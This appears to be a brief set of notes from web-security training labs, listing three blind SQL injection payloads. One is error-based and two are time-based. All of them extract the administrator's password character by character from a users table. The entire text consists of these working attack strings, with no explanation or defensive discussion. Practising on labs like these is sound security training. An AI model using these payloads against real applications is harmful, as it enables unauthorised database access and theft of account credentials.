
second laba:
'||(SELECT CASE WHEN SUBSTR(password,1,1)>'a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' -- .

third laba:
'||(SELECT CASE WHEN SUBSTRING(password,1,1)>'a' THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users WHERE username='administrator') -- .
'||(CASE WHEN (1=1) THEN pg_sleep(2) ELSE pg_sleep(0) END) -- .
